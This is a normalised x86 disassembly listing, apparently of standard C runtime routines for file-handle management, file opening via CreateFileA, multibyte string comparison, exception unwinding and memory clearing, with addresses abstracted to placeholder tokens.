mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_405d52
and [ eax ] 0x0
call sub_405d3f
mov [ eax ] 0x9
call sub_405d52
and [ eax ] 0x0
call sub_405d3f
mov [ eax ] 0x9
call sub_4071e0
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
or eax 0xffffffff
pop ebp
retn
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_40dd3b
push 0xc
push r--data
call sub_409f90
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_409da0
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_409fd5
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40ddd1
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_40ddda
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_40de01
push 0x18
push r--data
call sub_409f90
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_409cde
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_409da0
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40df91
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rw-data ]
test esi esi
je r-xdata
call sub_409fd5
retn
push 0x40
push 0x20
call sub_40c0ac
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rw-data ]
add eax 0x800
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rw-data ]
mov [ ecx ] eax
add [ rw-data ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_40dd3b
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x40
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x40
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x800
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_409da0
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_40ded3
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
sub esi [ edi * 4 + rw-data ]
sar esi 0x6
mov eax edi
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_40df9a
push 0x10
push r--data
call sub_409f90
xor ebx ebx
mov [ ebp - 0x1c ] ebx
push 0x1
call sub_409da0
pop ecx
mov [ ebp - 0x4 ] ebx
push 0x3
pop edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40e02d
mov eax [ ebp - 0x1c ]
call sub_409fd5
retn
mov esi edi
mov eax [ rw-data ]
cmp [ eax + esi * 4 ] ebx
je r-xdata
inc edi
jmp r-xdata
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] edi
cmp edi [ rw-data ]
jge r-xdata
cmp edi 0x14
jl r-xdata
push eax
call sub_405649
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_404538
pop ecx
mov eax [ rw-data ]
mov [ eax + esi * 4 ] ebx
inc [ ebp - 0x1c ]
sub_40e036
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
xor ebx ebx
test [ ebp + 0x10 ] 0x80
push esi
mov esi eax
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x30 ] 0xc
mov [ ebp - 0x2c ] ebx
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40718e
int3
mov eax 0x8000
test [ ebp + 0x10 ] eax
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_40f403
pop ecx
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
and eax 0x3
sub eax ebx
mov ecx 0xc0000000
mov edx 0x80000000
je r-xdata
test [ ebp + 0x10 ] 0x74000
jne r-xdata
mov [ ebp - 0xc ] edx
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x24 ] eax
je r-xdata
mov [ ebp - 0x14 ] ebx
sub eax ecx
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0xc ] 0x40000000
jmp r-xdata
test [ ebp + 0x10 ] 0x70000
jne r-xdata
mov [ ebp - 0xc ] ecx
jmp r-xdata
call sub_405d52
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_405d3f
push 0x16
pop esi
mov [ eax ] esi
call sub_4071e0
mov eax esi
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x18 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
push edi
mov edi 0x100
cmp eax ecx
jg r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
pop esi
pop ebx
leave
retn
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x18 ]
test cl cl
js r-xdata
mov [ ebp - 0x18 ] 0x5
jmp r-xdata
cmp eax edx
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x80
test edi eax
je r-xdata
cmp eax edi
je r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
test eax 0x1000
je r-xdata
or [ ebp - 0x10 ] 0x4000000
or [ ebp - 0xc ] 0x10000
or [ ebp - 0x14 ] 0x4
mov [ ebp - 0x10 ] 0x1
call sub_405d52
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_405d3f
push 0x16
pop esi
mov [ eax ] esi
call sub_4071e0
mov eax esi
mov [ ebp - 0x18 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp [ ebp - 0xc ] edx
sete al
mov [ ebp - 0x14 ] eax
jmp r-xdata
test al 0x20
je r-xdata
or [ ebp - 0x10 ] edi
cmp eax 0x300
jne r-xdata
test al 0x10
je r-xdata
or [ ebp - 0x10 ] 0x8000000
jmp r-xdata
mov [ ebp - 0x18 ] 0x2
jmp r-xdata
call sub_40de01
or ebx 0xffffffff
mov [ esi ] eax
cmp eax ebx
jne r-xdata
or [ ebp - 0x10 ] 0x10000000
mov eax [ ebp + 0x8 ]
mov edi [ CreateFileA@IAT ]
push 0x0
push [ ebp - 0x10 ]
mov [ eax ] 0x1
push [ ebp - 0x18 ]
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
call sub_405d52
and [ eax ] 0x0
mov [ esi ] ebx
call sub_405d3f
mov [ eax ] 0x18
call sub_405d3f
mov eax [ eax ]
jmp r-xdata
push [ ebp - 0x20 ]
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
pop edi
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_405d65
pop ecx
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
test esi esi
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_405d65
test [ ebp + 0x10 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_405d3f
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_405d3f
mov [ eax ] 0xd
jmp r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
and [ ebp - 0xc ] 0x7fffffff
push 0x0
push [ ebp - 0x10 ]
lea eax [ ebp - 0x30 ]
push [ ebp - 0x18 ]
push eax
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
push [ ebp - 0x20 ]
push [ esi ]
call sub_40dbcb
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
pop ecx
shl eax 0x6
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
shl eax 0x6
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
cmp [ ebp - 0x3 ] 0x0
mov [ eax ] cl
jne r-xdata
mov edi 0x74000
mov ecx 0x4000
test [ ebp + 0x10 ] edi
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax edi
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x24 ]
and eax edi
jne r-xdata
push 0x2
push ebx
push [ esi ]
call sub_40b516
mov edi eax
add esp 0xc
cmp edi ebx
jne r-xdata
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] 0x0
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] ecx
jmp r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push [ esi ]
mov [ ebp - 0x4 ] 0x0
call sub_40a7c4
add esp 0xc
test eax eax
jne r-xdata
call sub_405d52
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
push 0x0
push [ ebp - 0x10 ]
lea eax [ ebp - 0x30 ]
push 0x3
push eax
push [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
and eax 0x7fffffff
push eax
push [ ebp + 0xc ]
call [ CreateFileA@IAT ]
cmp eax ebx
jne r-xdata
xor edi edi
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x1c ] edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push 0x0
push 0x0
push [ esi ]
call sub_40b516
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x1a
jne r-xdata
push [ esi ]
call sub_40b65f
jmp r-xdata
mov esi [ esi ]
mov ecx esi
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
mov [ esi + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_405d65
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
push [ esi ]
call sub_40dc4c
pop ecx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax edi
cdq
push edx
push eax
push [ esi ]
call sub_40f192
add esp 0xc
cmp eax ebx
je r-xdata
pop ecx
mov eax [ ebp - 0x18 ]
cmp eax edi
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x1c ]
push eax
push [ esi ]
call sub_40a7c4
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x18 ]
cmp eax edi
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x1c ] 0xbfbbef
push 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push edi
push edi
push [ esi ]
call sub_40c967
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x1c ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp ebx edi
jg r-xdata
mov [ ebp - 0x1c ] 0xfeff
push 0x2
jmp r-xdata
push edi
push edi
push edi
push [ esi ]
call sub_40c967
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_40b65f
pop ecx
call sub_405d3f
push 0x16
pop esi
mov [ eax ] esi
mov [ ebp - 0x8 ] esi
jmp r-xdata
push edi
push edi
push [ esi ]
call sub_40b516
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x1c ] 0xbfbbef
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax ebx
sub eax edi
push eax
lea eax [ ebp + edi - 0x1c ]
push eax
push [ esi ]
call sub_409a53
add esp 0xc
cmp eax 0xffffffff
je r-xdata
or ebx 0xffffffff
pop ebx
jmp r-xdata
push edi
push 0x2
push [ esi ]
call sub_40b516
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push edi
push edi
push [ esi ]
call sub_40c967
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push edi
push edi
push edi
push [ esi ]
call sub_40c967
and eax edx
add esp 0x10
cmp eax ebx
je r-xdata
sub_40e76a
push 0x14
push r--data
call sub_409f90
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x18 ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
or [ esi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] edi
setne al
cmp eax edi
je r-xdata
call sub_405d3f
push 0x16
pop esi
mov [ eax ] esi
call sub_4071e0
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
call sub_409fd5
retn
mov [ ebp - 0x4 ] edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax esi
call sub_40e036
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40e800
mov eax [ ebp - 0x20 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ esi ] 0xffffffff
sub_40e800
cmp [ ebp - 0x1c ] edi
je r-xdata
retn
cmp [ ebp - 0x20 ] edi
je r-xdata
push [ esi ]
call sub_40ddda
pop ecx
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_40e82e
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40e76a
add esp 0x18
pop ebp
retn
sub_40e84e
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x18 ]
call sub_4047c5
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40492e
add esp 0xc
cmp [ ebp - 0xc ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
cmp [ ebp - 0xc ] bl
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
push esi
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
cmp [ ebp - 0xc ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx [ ebp - 0x8 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx edx
movzx ecx [ ecx + 0x11d ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov dl [ edx ]
cmp dl bl
jne r-xdata
movzx ecx [ edi ]
test [ ecx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
movzx edx [ ebp - 0x4 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov [ ebp - 0x8 ] ecx
shl ecx 0x8
movzx edx dl
or cx dx
inc [ ebp + 0x8 ]
movzx ecx cx
mov si cx
mov [ ebp - 0x8 ] ecx
cmp si [ eax + 0x10 ]
jb r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
mov si bx
jmp r-xdata
mov ecx edx
movzx ecx [ ecx + 0x11d ]
jmp r-xdata
mov dl [ edi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp si [ eax + 0x16 ]
jb r-xdata
cmp si [ eax + 0x12 ]
ja r-xdata
mov si [ ebp - 0x8 ]
xor eax eax
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0x4 ] ecx
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0xc ] bl
je r-xdata
cmp si bx
je r-xdata
shl ecx 0x8
movzx edx dl
or cx dx
movzx ecx cx
inc edi
mov [ ebp - 0x4 ] ecx
cmp cx [ eax + 0x10 ]
jb r-xdata
mov cx [ ebp - 0x4 ]
movzx ecx [ edi ]
movzx edx cl
inc edi
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x4 ] ecx
je r-xdata
cmp si [ eax + 0x18 ]
ja r-xdata
add si [ eax + 0x14 ]
jmp r-xdata
pop esi
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
cmp cx [ eax + 0x16 ]
jb r-xdata
cmp cx [ eax + 0x12 ]
ja r-xdata
add si [ eax + 0x1a ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
movzx ecx [ ecx ]
dec [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
movzx edx cl
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ecx
je r-xdata
cmp cx si
jne r-xdata
cmp cx [ eax + 0x18 ]
ja r-xdata
add cx [ eax + 0x14 ]
jmp r-xdata
add cx [ eax + 0x1a ]
jmp r-xdata
sub_40ea6c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_4047c5
mov edi [ ebp - 0xc ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
leave
retn
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_404a11
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
movzx ecx [ ebx ]
dec [ ebp + 0x10 ]
movzx eax cl
inc ebx
test [ eax + edi + 0x1d ] 0x4
je r-xdata
call sub_405d3f
mov [ eax ] 0x16
call sub_4071e0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx eax [ esi ]
movzx edx al
inc esi
test [ edx + edi + 0x1d ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
cmp ax cx
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov al [ ebx ]
test al al
jne r-xdata
movzx eax [ esi ]
xor ecx ecx
test [ eax + edi + 0x1d ] 0x4
je r-xdata
pop esi
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test cx cx
je r-xdata
mov dl [ esi ]
dec [ ebp + 0x10 ]
test dl dl
je r-xdata
xor eax eax
jmp r-xdata
shl ecx 0x8
movzx eax al
or cx ax
movzx ecx cx
inc ebx
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
shl eax 0x8
movzx edx dl
or ax dx
movzx eax ax
inc esi
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_40ebe0
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ec00
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_4042ed
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_40ec45
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_40ec45
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_40ec00
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_40ecf5
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_40ed14
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_40ecec
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_40ecf5
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_40ed17
pxor xmm0 xmm0
push ecx
push ebx
mov eax ecx
and eax 0xf
test eax eax
jne r-xdata
mov ebx eax
neg ebx
add ebx 0x10
sub edx ebx
xor eax eax
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov eax edx
and edx 0x7f
shr eax 0x7
je r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
lea esp [ esp ]
pop edx
jmp r-xdata
mov [ ecx ] eax
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop ebx
pop eax
retn
mov eax edx
shr eax 0x4
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
